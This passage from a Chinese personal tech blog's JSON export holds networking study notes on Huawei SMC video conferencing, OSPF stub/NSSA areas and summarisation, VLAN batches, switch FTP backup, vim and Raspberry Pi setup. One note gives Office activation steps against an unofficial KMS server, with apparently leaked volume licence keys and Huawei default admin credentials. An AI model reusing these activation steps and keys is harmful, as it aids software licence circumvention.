输入SC的IP地址，因为是内置的SC所以，SC的地址是127.0.0.1，如果是外置的SC我们则需要输入SC的管理地址，用户名和密码保持默认，点击“下一步”， 进入SC的配置界面，输入SC的名称，单击“添加”即可，状态指示灯变为绿色代表SC添加成功。点击SC的名称进行本地管理域的配置。 单击SC的名称后，我们得到SC的管理界面。 点击本地管理域，我们得到本地管理域界面。本地管理域的作用是用来管理各个不同的终端和MCU，用来分配一个前缀号码。 点击“添加”，输入名称，类型选择前缀号，匹配内容可以选择自定义比如说杭州的区号：0571，点击“保存”。然后我们看到hangzhou的本地管理域，匹配内容为0571，接下来要添加 终端和MCU，他们的短号必须以0571为开头。 接下来创建SMC2.0 的服务区，配置服务区的目的是为了更好的管理MCU，首先在SMC的管理界面上单击“系统”，选择“配置”，在里面选择“服务区”的配置， 添加服务区的名称hangzhou，点击“添加”， 再点击添加前缀。配置前缀名称和服务区的前缀号，前缀名称可以和服务区相同，也可以不同，服务区的前缀可以保持和SC的本地管理域的号码相同，点击“添加” SMC2.0添加MCU首先需要在浏览器的输入MCU的IP地址，进入MCU的web管理界面， 首先我们需要确定一下MCU的系统状态，单击“设备管理”，选择“系统配置”，单击“管理配置”，看到连接状态为SMC2.0,如果是web状态，或者是第三方状态，我们需要选择SMC2.0，然后重启MCU，其余参数可以保持不变，连接密码建议修改，单击“保存”。 接下来我们需要修改“SNMP”的配置，我们需要填写“Trap服务器地址”，此地址为SMC2.0的地址，接下来配置SNMPV3的Trap设置，为了安全考虑需要修改此设置，首先配置用户名，修改Trap认证密码，修改Trap加密密码，点击“保存”。 接下来，我们来进行H.323和SIP配置，点击“设备管理”，选择H.323 SIP 配置。 首先我们需要勾选“GK配置”，修改GK地址，GK的IP地址就是SC的IP地址。在这里的话SC的地址和SMC2.0的IP地址是同一个，修改“GK的ID” 前缀号必须和SC的本地管理域的前缀号保持一致，再加一个尾号001即0571001，修改认证密码，点击保存。 接下来我们进行SIP配置，单击“SIP配置”，勾选注册SIP服务器，填写SIP服务器的地址，SIP服务器的地址就是SC的地址，SC的地址和SMC的地址为同一个，修改后我们再修改sip认证密码， 添加MCU首先点击“设备管理” 设备中找到“MCU”，在MCU的界面我们选择添加MCU， 输入MCU的IP地址，勾选SNMPV3协议，填写我们刚刚填写的用户名和密码，修改认证密码，修改加密密码，修改完成之后点击“下一步”，得到MCU的配置界面，输入MCU的名称，输入MCU的前缀号，这里的前缀号是我们配置服务区的前缀号0571， 输入连接密码，连接密码是和MCU的连接密码是同一个，再配置HTTP连接密码， 检查H.323的配置信息是否正确，修改认证密码，在检查SIP的配置信息是否正确，再修改认证密码，选择添加，添加完成之后稍等一会就会添加成功。 SMC2.0添加终端首先在地址栏输入终端的IP地址， 首先选择系统配置，选择服务器配置。云平台类型选择手动，H.323 GK 注册选择启用，注册方式选择手动， 接下来修改GK的地址，再修改H.164的ID也就是短号，修改H.323ID前缀号加尾号，修改认证用户名，修改认证密码，同样修改SIP配置。 接下来单击SNMP设置。 填写Trap服务器的地址，此地址为SMC2.0的地址，修改SNMP的用户名和密码，也可以保持默认不变，为了安全还是可以修改。终端侧配置完成，接下来去SMC2.0上进行配置。 单击“设备”，选择“会场”，点击“添加会场”，输入终端的IP地址，认证信息保持默认，勾选SNMP V3协议，如果我们修改后修改认证密码，认证密码和加密密码必须和终端侧保持一致，点击下一步。 进入终端的配置界面 输入终端的名称，修改认证密码，查看SIP注册是否注册成功，修改认证密码，加密密码。和终端保持一致。 会议召集登陆SMC web界面 在菜单栏点击“会议”，选择“新建会议”，配置“会议名称”，填写开始时间，选择会场时长，选择“添加会场”，选中会场，选择会场高级参数，选择 拖动某一个终端到这里就代表这个就是主会场。 我们也可以选择MCU，如果我们选择自动，终端就会自动添加到MCU之中。 点击预约会议即可。 SMC 2.0 召集Ad hoc会议。 点击会议，选择会议模版，选择添加新的会议模版，修改会议名称，设置好名称之后，选择会议时长，然后点击高级参数， 然后再“添加会场”。把我们所需要的会场添加进去。添加完之后，保存为模版，现在我们点击会议，选择会议列表，发现会议列表为空， 然后我们进入终端的web界面。 单击“呼叫”，填写我们刚刚填写的接入号。点击“呼叫”。 在终端侧点击“二次拨号”，输入激活密码（上边SMC中配置的，）以#号键结尾。 当我们想入会时，就只需要在终端侧呼叫时，输入接入号，和会议密码就可以。 会控操作 添加会场之后，SMC2.0会自动呼叫会场。会场的状态有两种，一种是入会，一种是离会， 添加会场： 移除会场： 可以选择呼叫和挂断某一个终端 讨论模式：会场的所有麦克风都会被打开。 观看模式：可以自由的选择观看的会场。","categories":[{"name":"技术","slug":"技术","permalink":"http://sakuramuxia.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"H.323","slug":"H-323","permalink":"http://sakuramuxia.github.io/tags/H-323/"},{"name":"SIP","slug":"SIP","permalink":"http://sakuramuxia.github.io/tags/SIP/"},{"name":"SMC","slug":"SMC","permalink":"http://sakuramuxia.github.io/tags/SMC/"},{"name":"MCU","slug":"MCU","permalink":"http://sakuramuxia.github.io/tags/MCU/"}],"author":"SakuraMuxia"},{"title":"HCNP学习笔记20","slug":"hcnp20","date":"2021-07-10T06:47:00.000Z","updated":"2021-07-10T07:13:50.094Z","comments":true,"path":"post/ea49.html","link":"","permalink":"http://sakuramuxia.github.io/post/ea49.html","excerpt":"","text":"OSPF特殊区域和汇总 传输区域：他会承载其他区域的流量，比如说Area0，区域1到区域2需要靠他传输。 末端区域：没有其他区域的流量会经过他。 七类LSAStub和Totally Stub区域 Hello数据包中，Option中的信息 在所有的路由器中打上，原因是在于建立邻居需要Option中的参数都得一致。 stub //配置为末节区域 在R5路由器上配置的 stub no-summary //末节区域屏蔽三类LSA，除了一条缺省的路由,邻居需要重新建立，在R4路由器上配置的。 NSSA和Totally NSSA区域 外部路由从RTA到RTB到RTD这一条路的路由不会存在，原因是因为Area1中没有四类和五类的LSA了，但是这个Area1区域中又有自己的ASBR，这个ASBR要注入外部路由，这个路由默认是五类的，那么我们末节网络是不允许五类的，所以这个LSA是七类，RTD在这个注入的路由是七类的，这个外部路由要转到其他区域，其他区域是正常区域，所以在RTB这边ABR就需要七转五，既然RTB转了就是RTB的身份了，Area2中多了一个四类，Area0中没有四类LSA的原因是在于RTB自己会自动的宣告身份，宣告这个五类路由，所以在Area0中知道这个存在。 sys ospf a 2 nssa //配置为nssa区域 acl 2000 //新建acl进行过滤 rule per so 5.5.5.5 0 //新建规则允许源5.5.5.5 q route-p wakin p n 10 if acl 2000 ospf 1 import-route direct route-policy wakin q dis ospf lsdb 在所有路由器上配置stub nssa只有在ABR上配置stub no-summary或NSSA no-summary 外部的区域访问包含七类的区域，就需要RTB的ABR发布一个缺省的路由，这个缺省路由就是七类的。如果再屏蔽三类的，就需要RTB的ABR再发布一个三类的缺省路由。NSSA在区域1中既有自己的外部路由，七类的从RTB传出去，又在其他地方进来的外部路由屏蔽掉了，七类只有在NSSA区域中。 如果有多个ABR转化路由器是NSSA区域中Route-ID最大的转 其中图左边2.2.2.2为这个区域的ABR，他发进来的这缺省是为了方便访问其他的外部路由，4.4.4.4是这个区域的ASBR，只能以七类LSA存在，而如果配置Totally NSSA就相当于前边的三类也没有了，但是会多一条三类的缺省。 现在对于Area0来讲，三类应该有四个，区域间路由 四类没有，上边注入的外部路由就不需要。然后是R1注入的但是被R2进行7转5了，所以在Area0中就没有4类的LSA， 而五类有三条，6.6.6.6 9.9.9.9 99.99.99.99 对于Area2而言 对于Area1而言，7类的有两个，一个是99.99.99.99 是R1产生的，一个是R2产生的缺省的7类的。 这边配置了Stub，这边的4 5 类LSA就进不来了，多一条三类的缺省路由， 配置了Totally 3类也没有了，依然保留三类的缺省。 如果配置了NSSA，4 5 类都进不来了，有一条7类的默认，如果配置了Totally NSSA，也要配置3类的默认路由。 综合案例 相关配置 在NSSA中只有配置有缺省的路由，然后再配置一个default-route-advertise ASBR才能产生缺省路由。 LSA总结 LSA更新规则 当删除一个末节网络时，他会产生一个LSA类型3的Age为3600s的数据包，这个更新是在R3和R4之间抓到的数据包，R4 R5也有更新，但是R4和R5的更新里面，他是重新发送了一个类型1，这个类型1里就是告诉你，我现在这个类型1是R5发送的，就是1s,因为一开始类型1是包含两条链路信息，现在我这个类型1是包含1条链路信息，他不是删除这条LSA而是，删除这个LSA里面的一条链路信息， 区域2中包含的类型1的LSA的序列号+1，表示更新，这里面的LSA发现没有了5.5.5.5了，那么我（Area2）发送的三类LSA要怎么告诉其他外部的路由器呢，于是就是发送Age信息为3600s的，让所有路由器知道，然后把它删除， 路由汇总 OSPF内的路由信息是无法汇总的，只有在区域间才可以汇总。 sys sys R6 int lo 0 ip add 172.16.0.1 24 int lo 1 ip add 172.16.1.1 24 int lo 2 ip add 172.16.2.1 24 int lo 3 ip add 172.16.3.1 24 //在R3上引用 sys sys R3 ip route-s 172.16.0.0 24 36.0.0.6 ip route-s 172.16.1.0 24 36.0.0.6 ip route-s 172.16.2.0 24 36.0.0.6 ip route-s 172.16.3.0 24 36.0.0.6 import-route direct route-policy wakin //注入静态路由 dis ospf lsdb //查看数据库 ospf asbr-summary 172.16.0.0 255.255.252.0 sys sys R5 int lo 0 ip add 172.16.4.1 24 int lo 1 ip add 172.16.5.1 24 int lo 2 ip add 172.16.6.1 24 int lo 3 ip add 172.16.7.1 24 ospf 1 a 2 net 172.16.4.0 0.0.0.255 net 172.16.5.0 0.0.0.255 net 172.16.6.0 0.0.0.255 net 172.16.7.0 0.0.0.255 R3 R4需要配置 路由汇总， sys sys R4 注意 汇总5类或者7类的时候，5类和7类不属于任何区域，所以在进程下边敲命令，R4是要汇总区域2中的路由，所以要先进入区域2，再配置abr-summary ，这两条命令是有区别的，一个是在区域内，一个是在区域间， 区域间路由汇总 外部路由汇总 回到上边的问题：汇总路由的开销，以及汇总路由什么时候消失。 默认汇总路由的明细路由是1，这个Metric是怎么计算的呢， int lo 2 //进入相关的接口 ospf cost 10 //更改ospf开销为10 汇总包含的明细中，如果明细中的开销不一致，那么默认R4 发送出去的是最大的开销值。 R4 到达汇总的是11，所以到达R3的开销值就是12，过了一个路由就加1，开销不一样我们看最大的那一个。 汇总什么时候消失呢，汇总的好处就是，明细路由的up或者down，不会通告给被汇总外的设备，也就是说他怎么提高稳定性呢，假如说有一条明细路由挂了之后，修改了，只要不影响大局，或者这条明细挂掉了， 不是 通告汇总外的其他路由器，汇总内的路由器会发送1类和2类的更新，但是不会发送3类信息。但是更改了开销值就会发生3类信息的更新。当明细全部挂了之后，汇总就会消失，汇总要精确。 OSPF综合应用场景 问题1：需要建立虚连接，没有直接相连就需要建立虚连接。 问题2：Area1需要配置NSSA。 问题3：配置路由认证。 问题4：type1。 Area24 配置totally-stub，area16配置totally-nssa，area35配置totally-stub，内部路由的汇总节点要选择清除，最左边汇总的地方在R2上汇总，中间的在R6上汇总，最右边在R3上汇总，R3和R1要建立虚连接，要不然就会产生隔离。","categories":[{"name":"技术","slug":"技术","permalink":"http://sakuramuxia.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"OSPF外部路由","slug":"OSPF外部路由","permalink":"http://sakuramuxia.github.io/tags/OSPF%E5%A4%96%E9%83%A8%E8%B7%AF%E7%94%B1/"},{"name":"OSPF Stub","slug":"OSPF-Stub","permalink":"http://sakuramuxia.github.io/tags/OSPF-Stub/"},{"name":"OSPF Totally-Stub","slug":"OSPF-Totally-Stub","permalink":"http://sakuramuxia.github.io/tags/OSPF-Totally-Stub/"},{"name":"OSPF NSSA","slug":"OSPF-NSSA","permalink":"http://sakuramuxia.github.io/tags/OSPF-NSSA/"},{"name":"OSPF Totally-NSSA","slug":"OSPF-Totally-NSSA","permalink":"http://sakuramuxia.github.io/tags/OSPF-Totally-NSSA/"}],"author":"SakuraMuxia"},{"title":"HCNP学习笔记19","slug":"hcnp19","date":"2021-07-09T06:45:00.000Z","updated":"2021-07-09T05:39:27.012Z","comments":true,"path":"post/1c89.html","link":"","permalink":"http://sakuramuxia.github.io/post/1c89.html","excerpt":"","text":"OSPF外部路由前言 实验 dis ip routeing-table 6.6.6.6 //查看IP路由表去往6.6.6.6的路由信息 default-route-advertise always //通过ospf发布缺省路由信息（当默认没有配置缺省路由时加always） dis ospf lsdb //查看ospf数据库 R3就是ASBR 外部路由的引入import 导入 引入 华为 华三 redistribute 重发布/重分发 思科 import-route static //引入静态路由，从主路由器引入 第五类LSA数据包结构 5类是通过ASBR产生的，他是在整个OSPF进程域中传播的，而且这个宣告者是不会变的，这就是一个问题，大家都知道这个外部路由是由3.3.3.3 通告的，但是R1和R5不知道3.3.3.3是怎么走的，3.3.3.3只有在区域0里的人才知道怎么走，这就是4类存在的价值，4类存在的价值就是告诉3.3.3.3BR该怎么走 三类LSA会由ABR重新产生，四类LSA也会由ABR重新产生。 dis ospf lsdb asbr //验证ospf 四类lsa的路由信息 第四类LSA数据包结构 如上图，ASBR产生五类的LSA信息，五类的在所有的区域内泛洪，而且是不更改宣告着ID，永远是ADBR的ID，所以在其他区域，除了在ASBR所在的区域外，其他区域找不到这个route ID ， 因此连接这个区域的ABR就有必要，有义务，产生四类的LSA。 案例 ASBR的出现是随意的，到后边的优化才会出现。 R1配置 sys sys R1 int g0/0/1 ip add 18.0.0.1 24 q ip route-s 8.8.8.8 32 18.0.0.8 ospf 1 import-route static //注入静态路由 acl 2000 //新建一个策略 rule permit so 18.0.0.0 0.0.0.255 //只允许18网段 route-policy wakin permit node 10 //新建一个路由策略允许wakin这个路由策略节点编号为10 if match acl 2000 // import-route direct route-policy wakin //挂载直连路由附加路由策略 //宣告18网段地址 sys R8配置 sys sys R8 int g0/0/0 ip add 18.0.0.8 24 int lo 8 ip add 8.8.8.8 32 ip route-s 0.0.0.0 0 18.0.0.1 //添加静态路由 R7配置 sys sys R7 int g0/0/0 ip add 57.0.0.7 24 int lo 8 ip add 7.7.7.7 32 ip route-s 0.0.0.0 0 57.0.0.5 //添加静态路由，吓一跳为对端IP地址。 R5配置 sys sys R5 int g0/0/1 ip add 57.0.0.5 24 ip route-s 7.7.7.7 32 57.0.0.7 //添加静态路由，吓一跳为对端IP地址。 import-route static //导入静态路由 其中7.7.7.7 8.8.8.8 6.6.6.6 都是外部路由 区域1中的五类LSA有四条，即有几个外部路由就有几条五类LSA，所有的区域中五类LSA都是一样的。 区域1中的四类LSA有两条，分别是R2发的3.3.3.3 和5.5.5.5 区域0中的四类LSA有两条，分别是R2的1.1.1.1 和 R4 的5.5.5.5 区域2中的四类LSA有两条，分别是R4发的3.3.3.3 和 1.1.1.1 dis ospf routing //查看ospf路由表 五类的数据包类型 外部路由类型 import-route static type 2 //导入外部静态路由类型2 不计算内部开销 import-route static type 1 //导入外部静态路由类型1 计算内部开销 import-route static type 1 cost xxx//导入外部静态路由类型1 计算内部开销配置开销为xxx PS：E1优先于E2，计算内部开销比不计算内部开销更优先。 如果两个都是类型2，这个时候再比较开销， 外部路由引入配置案例 //直连有时候也需要注入，会把所有直连的都注入，但是我们需求的是只需要某些路由。而不是全部的，这个时候就需要引入路由策略。 次优外部路由的产生原因 sys R1 int g0/0/1 ospf 1 a 1 net 18.0.0.1 0.0.0.0 dis ospf lsdb ase 8.8.8.8 //查看ospf lsdb 详细信息 8.8.8.8 次优外部路由的作用就是如果在引入OSPF中的外部路由的下一跳在一个ospf区域内，例如上图中R9的回环口地址，在R1的右侧接口宣告过，那么在R1注入到R9的静态路由后，区域内的其他路由器访问R9的回环口，下一跳地址就直接是R9的接口地址。","categories":[{"name":"技术","slug":"技术","permalink":"http://sakuramuxia.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"OSPF外部路由","slug":"OSPF外部路由","permalink":"http://sakuramuxia.github.io/tags/OSPF%E5%A4%96%E9%83%A8%E8%B7%AF%E7%94%B1/"}],"author":"SakuraMuxia"},{"title":"HCNP学习笔记18-补充","slug":"hcnp18-补充","date":"2021-07-06T06:55:00.000Z","updated":"2021-07-06T05:47:01.405Z","comments":true,"path":"post/a31c.html","link":"","permalink":"http://sakuramuxia.github.io/post/a31c.html","excerpt":"","text":"批量加入 Vlan华为交换机单独加入vlan太麻烦，思科有批量加入vlan的方法，华为也有。要求 16口划分到vlan2,612口划分到vlan3,1318口划分到vlan4,1924口划分到vlan5.25,~26 加入trunk 创建vlan 2~vlan4,4个vlan 也可以使用命令 batch 2 to 52端口port1port6划分到vlan2[HW2700-2]port-group g2[HW2700-2-port-group-g2]group-member Ethernet 0/0/1 to Ethernet 0/0/6 选择16 端口[HW2700-2-port-group-g2]port link-type access 接口为access口，显示1~6口设置为access类型 [HW2700-2-port-group-g2]port default vlan 2 端口组所有端口加入vlan2 3 .port7~port12加入vlan3.[HW2700-2]port-group g3[HW2700-2-port-group-g3]group-member Ethernet 0/0/6 to Ethernet 0/0/12[HW2700-2-port-group-g3]port link-type access 所有接口配置为access类型[HW2700-2-port-group-g3]port default vlan 3 显示如下 [HW2700-2]port-group g6[HW2700-2-port-group-g6]group-member GigabitEthernet 0/0/1 to GigabitEthernet 0/0/2 选择2端口[HW2700-2-GigabitEthernet0/0/1]port link-type trunk 端口G0 /0/1~G0/0/2 加入trunk. 华为默认交换机账户密码 admin Admin@huawei.com 问题描述S5700需要将配置进行备份，如何将配置导出？ 解决方案1.通过web界面导出 如果是V200R001以及后面的版本，可以在web界面导出 单击导航栏中“系统管理 &gt; 文件管理 &gt; 文件管理”菜单，进入“文件管理”界面。 选择需要下载的文件名称，单击“下载”将配置文件下载到本地 2.通过命令行下载 1）在命令行敲display current-configuration 敲此命令后，可以查看设备的所有配置，将配置可以粘贴出来（适用于配置较少情况) 2）通过FTP方式将配置文件导出： （1）将设备配置为FTP服务器，PC配置为FTP客户端 在Switch上创建VLAN 10，并配置VLAN 10的接口IP地址为10.1.1.2/24 &lt;Quidway&gt; system-view [Quidway] vlan 10 [Quidway-vlan10] quit [Quidway] interface gigabitethernet 0/0/1 [Quidway-GigabitEthernet0/0/1] port hybrid pvid vlan 10 [Quidway-GigabitEthernet0/0/1] port hybrid untagged vlan 10 [Quidway-GigabitEthernet0/0/1] quit [Quidway] interface vlanif 10 [Quidway-Vlanif10] ip address 10.1.1.2 24 （2）在Switch上启动FTP服务，并配置FTP用户名u1，口令ftppwd [Quidway] ftp server enable [Quidway] aaa [Quidway-aaa] local-user u1 password cipher ftppwd [Quidway-aaa] local-user u1 service-type ftp [Quidway-aaa] local-user u1 privilege level 15 [Quidway-aaa] local-user u1 ftp-directory flash:/ [Quidway-aaa] return （3）在PC机上，向Switch发起FTP连接，输入用户名u1和口令ftppwd PC机上的FTP客户端以Window XP操作系统为例说明。 C:\\WINDOWS\\Desktop&gt; ftp 10.1.1.2 Connected to 10.1.1.2. 220 FTP service ready. User (10.1.1.1:(none)): u1 331 Password required for u1 Password: 230 User logged in. ftp&gt; （4）在PC机上，配置二进制传输格式和PC机本地目录 ftp&gt; binary 200 Type set to I. ftp&gt; lcd c:\\temp Local directory now C:\\temp. （5）在PC上，从Switch下载文件vrpcfg.cfg ftp&gt; get vrpcfg.cfg vrpcfg.cfg 200 Port command okay. 150 Opening BINARY mode data connection for vrpcfg.cfg. （6）退出ftp连接 ftp&gt; quit C:\\WINDOWS\\Desktop&gt; Office2016激活KMS命令激活Office2016步骤如下： 1、首先查看Office2016安装目录在哪里，如果是默认安装，没有修改路径，在C:\\Program Files\\Microsoft Office\\Office16目录下，64位系统装32位office路径是C:\\Program Files (x86)\\Microsoft Office\\Office16，具体路径还得自行查看； 2、接着右键点击开始图标，选择【Windows PowerShell(管理员)】，或者【命令提示符(管理员)】； 3、打开命令提示符，复制这个命令，在命令窗口鼠标右键，会自动粘贴，按回车进入office2016安装路径，如果你不是在这个目录，需手动修改； ①32位系统装32位office或者64位系统装64位office命令： cd “C:\\Program Files\\Microsoft Office\\Office16” ②64位系统装32位office命令： cd “C:\\Program Files (x86)\\Microsoft Office\\Office16” 4、接着复制下面这个命令，在命令窗口鼠标右键自动粘贴命令，按回车执行，安装office2016专业增强版密钥，如果提示无法找到脚本文件，说明第3步打开的路径错误，需要执行另一个命令； cscript ospp.vbs /inpkey:XQNVK-8JYDB-WJ9W3-YJ8YR-WFG99 【Office Professional Plus 2016：XQNVK-8JYDB-WJ9W3-YJ8YR-WFG99】 【Office Standard 2016：JNRGM-WHDWX-FJJG3-K47QV-DRTFM】 5、接着复制这个命令，右键自动粘贴，按回车，设置kms服务器； cscript ospp.vbs /sethst:kms.03k.org 6、最后执行这个命令，按回车激活office2016； cscript ospp.vbs /act 7、如果要查询office2016激活状态，执行这个命令。 cscript ospp.vbs /dstatus 2019激活密钥一、Office 2019专业增强版大客户版MAK永久激活密钥： Office 2019 ProPlus2019XC2RVL MAKC2R： [Key]：N9J9Q-Q7MMP-XDDM6-63KKP-76FPM [剩余次数：900000+] Office 2019 VisioPro2019XC2RVL MAKC2R： [Key]：FHK9Q-NPXKY-QVQ9J-MXWMH-X78CP [剩余次数：900000+] Office 2019 ProjectPro2019XC2RVL MAKC2R： [Key]：F4QWT-NMMKH-XPTV9-W9HFB-B4JCQ [剩余次数：900000+] 二、Microsoft Office 2019 Vol版Gvlk**密钥(KMS激活专用)** Office Professional Plus 2019：NMMKJ-6RK4F-KMJVX-8D9MJ-6MWKP Office Standard 2019：6NWWJ-YQWMR-QKGCB-6TMB3-9D9HK Project Professional 2019：B4NPR-3FKK7-T2MBV-FRQ4W-PKD2B Project Standard 2019：C4F7P-NCP8C-6CQPT-MQHV9-JXD2M Visio Professional 2019：9BGNQ-K37YR-RQHF2-38RQ3-7VCBB Visio Standard 2019：7TQNQ-K3YQQ-3PFH7-CCPPM-X4VQ2 Access 2019：9N9PT-27V4Y-VJ2PD-YXFMF-YTFQT Excel 2019：TMJWT-YYNMB-3BKTF-644 FC-RVXBD Outlook 2019：7HD7K-N4PVK-BHBCQ-YWQRW-XW4VK PowerPoint 2019：RRNCX-C64HY-W2MM7-MCH9G-TJHMQ Publisher 2019：G2KWX-3NW6P-PY93R-JXK2T-C9Y9V Skype for Business 2019：NCJ33-JHBBY-HTK98-MYCV8-HMKHJ Word 2019：PBX3G-NWMT6-Q7XBW-PYJGG-WXD33 查看IP地址是从哪个接口出去的 dis arp xxx.xxx.xxx.xxx win10KMS激活N7KQR-YYM9Q-KRJQ4-8KPKG-3V66T 管理员CMD slmgr.vbs/skms xxx.xxx.xxx.xxx slmgr.vbs /ato 10.2.2.8","categories":[{"name":"技术","slug":"技术","permalink":"http://sakuramuxia.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"批量加入Vlan","slug":"批量加入Vlan","permalink":"http://sakuramuxia.github.io/tags/%E6%89%B9%E9%87%8F%E5%8A%A0%E5%85%A5Vlan/"},{"name":"交换机通过FTP上传下载文件","slug":"交换机通过FTP上传下载文件","permalink":"http://sakuramuxia.github.io/tags/%E4%BA%A4%E6%8D%A2%E6%9C%BA%E9%80%9A%E8%BF%87FTP%E4%B8%8A%E4%BC%A0%E4%B8%8B%E8%BD%BD%E6%96%87%E4%BB%B6/"},{"name":"Office激活","slug":"Office激活","permalink":"http://sakuramuxia.github.io/tags/Office%E6%BF%80%E6%B4%BB/"},{"name":"2019激活密钥","slug":"2019激活密钥","permalink":"http://sakuramuxia.github.io/tags/2019%E6%BF%80%E6%B4%BB%E5%AF%86%E9%92%A5/"},{"name":"win10KMS激活","slug":"win10KMS激活","permalink":"http://sakuramuxia.github.io/tags/win10KMS%E6%BF%80%E6%B4%BB/"}],"author":"SakuraMuxia"},{"title":"VIM使用教程","slug":"Vim","date":"2021-07-06T06:45:00.000Z","updated":"2021-07-12T13:59:11.623Z","comments":true,"path":"post/f42f.html","link":"","permalink":"http://sakuramuxia.github.io/post/f42f.html","excerpt":"","text":"VIM使用教程vi是“visual interface”的缩写，vim是vi IMproved(增强版的vi)。在一般的系统管理维护中vi就够用，如果想使用代码加亮的话可以使用vim。 vi有3个模式：插入模式、命令模式、低行模式。 插入模式：在此模式下可以输入字符，按ESC将回到命令模式。命令模式：可以移动光标、删除字符等。低行模式：可以保存文件、退出vi、设置vi、查找等功能(低行模式也可以看作是命令模式里的)。 一、打开文件、保存、关闭文件(vi命令模式下使用) vi filename //打开filename文件 :w //保存文件 :w vpser.net //保存至vpser.net文件 :q //退出编辑器，如果文件已修改请使用下面的命令 :q! //退出编辑器，且不保存 :wq //退出编辑器，且保存文件 二、插入文本或行(vi命令模式下使用，执行下面命令后将进入插入模式，按ESC键可退出插入模式) a //在当前光标位置的右边添加文本 i //在当前光标位置的左边添加文本 A //在当前行的末尾位置添加文本（大写） I //在当前行的开始处添加文本(非空字符的行首) O //在当前行的上面新建一行 o //在当前行的下面新建一行 R //替换(覆盖)当前光标位置及后面的若干文本 J //合并光标所在行及下一行为一行(依然在命令模式) 三、移动光标(vi命令模式下使用) 1、使用上下左右方向键 2、命令模式下：h 向左、j 向下 、k 向上、l 向右。空格键 向右、Backspace 向左、Enter 移动到下一行首、- 移动到上一行首。 四、删除、恢复字符或行(vi命令模式下使用) x //删除当前字符 nx //删除从光标开始的n个字符 dd //删除当前行 ndd //向下删除当前行在内的n行 u //撤销上一步操作 U //撤销对当前行的所有操作 五、搜索(vi命令模式下使用) /vpser //向光标下搜索vpser字符串 ?vpser //向光标上搜索vpser字符串 n //向下搜索前一个搜素动作 N //向上搜索前一个搜索动作 六、跳至指定行(vi命令模式下使用) n+ //向下跳n行 n- //向上跳n行 nG //跳到行号为n的行 G //跳至文件的底部 七、设置行号(vi命令模式下使用) :set nu //显示行号 :set nonu //取消显示行号 八、复制、粘贴(vi命令模式下使用) yy //将当前行复制到缓存区，也可以用 \"ayy 复制，\"a 为缓冲区，a也可以替换为a到z的任意字母，可以完成多个复制任务。 nyy //将当前行向下n行复制到缓冲区，也可以用 \"anyy 复制，\"a 为缓冲区，a也可以替换为a到z的任意字母，可以完成多个复制任务。 nyw //复制从光标开始的n个单词。 y^ //复制从光标到行首的内容。 y$ //复制从光标到行尾的内容。 p //粘贴剪切板里的内容在光标后，如果使用了前面的自定义缓冲区，建议使用\"ap 进行粘贴。 P //粘贴剪切板里的内容在光标前，如果使用了前面的自定义缓冲区，建议使用\"aP 进行粘贴 九、替换(vi命令模式下使用) :s/old/new //用new替换行中首次出现的old :s/old/new/g //用new替换行中所有的old :n,m s/old/new/g //用new替换从n到m行里所有的old :%s/old/new/g //用new替换当前文件里所有的old 十、编辑其他文件 :e otherfilename //编辑文件名为otherfilename的文件 十一、修改文件格式 :set fileformat=unix //将文件修改为unix格式，如win下面的文本文件在linux下会出现^M。 总结：vi(vim)教程虽然有比较多的命令，但是只要勤加练习，相信你会很快的熟练掌握，同时也会给你的工作或学习带来更高的效率。当如果不知道自己处在什么模式时可以按2次Esc键即可回到命令模式，会有最后提醒一点：注意大小写！！！ 三种模式 普通模式 写入模式 命令模式 i //进入写入模式 esc //退出写入模式，进入普通模式，可以开始执行指令 : //进入命令模式 :w //保存 :wq //保存退出 cat xxx.xxx //查看文件 vim xxx.xxx //vim 写入xxx文件 -------------------------------------------------------------- //修改vim键位，创建一个vim配置文件 cd //进入家目录 mkdir .vim //新建一个.vim文件夹 cd .vim //进入.vim文件夹 vim vimrc //新建一个文件vimrc i //进入写入模式 noremap a b //认为按的a键但是响应的是b键 &lt;CR> //代表回车 syntax on //代码高亮 set number //显示行号 set wrap //自动换行 set wildmenu //自动补全 set hlserrch //搜索高亮 set incsearch //边搜索边高亮 set ignorecase //忽略大小写 --------------------------------------------------------------- x //删除光标处信息 d 3 右 //删除光标处右边3个字符 d 3 左 //删除光标处左边3个字符 dd // 剪切这一行内容 p //粘贴 y 3 右 //复制右边三个字符 c 6 右 //删除右边6个字符并进入写入模式更改 w //一个词一个词进行跳转 b //回到上一个 c i x //把x之间的词全部删除并且进入写入模式 f xxx//寻找病跳转到xxx 0 //跳转到最开头 u //撤回 / //搜索按下回车就可以移动光标 树莓派nano /etc/wpa_supplicant/wpa_supplicant.conf //管理员权限编辑无线配置 #interface wlan0 #static ip_address=192.168.43.133/24 #static routers=192.168.43.1 #static domain_name_servers=223.5.5.5 ------------------------------------------------------------------ sudo ifconfig //查看网络配置 ssh登陆 $ssh xxx@192.168.1.5 //前边为用户名，后边为IP地址 $passwd //更改密码 ------------------------------------------------------------------ raspi-config //树莓派自带配置 //静态配置IP地址电口 ------------------------------------------------------------------ sudo iwlist scan | grep ESSID //查看附近wifi ------------------------------------------------------------------ ifconfig wlan0 //查看wlan0 的网卡配置 iwconfig wlan0 //查看wlan0 的网卡状态 ------------------------------------------------------------------ sudo vim /etc/wpa_supplicant/wpa_supplicant.conf //通过vim编辑无线网配置 network={ [Tab] ssid=\"你的wifi名称\" [Tab] key_mgmt=WPA-PSK [Tab] psk=\"你的wifi密码\" } ------------------------------------------------------------------ sudo nano /etc/dhcpcd.conf //更改dhcp配置文件配置静态ip interface eth0 static ip_address=192.168.2.20/24 static routers=192.168.2.1 static domain_name_servers=114.114.114.114 interface wlan0 static ip_address=192.168.2.21/24 static routers=192.168.2.1 static domain_name_servers=114.114.114.114 ------------------------------------------------------------------ sudo nano /etc/network/interfaces //进入接口进行静态配置IP地址 auto eth0 iface eth0 inet static address 192.168.2.20 netmask 255.255.255.0 gateway 192.168.2.1 allow-hotplug wlan0 iface wlan0 inet static address 192.168.2.21 netmask 255.255.255.0 gateway 192.168.2.1 wpa-conf /etc/wpa_supplicant/wpa_supplicant.conf ------------------------------------------------------------------ sudo raspi-config //raspberry系统配置工具 Network→Options→Wireless LAN→输入你的wifi名称→输入你的WiFi密码→Finished→Reboot→重启 ----------------------------------------------------------------- pwd // su和sudo的区别1、定义上： su为switch user，即切换用户的简写。su是最简单的身份切换名，用su我们能够进行不论什么用户的切换，一般都是su - 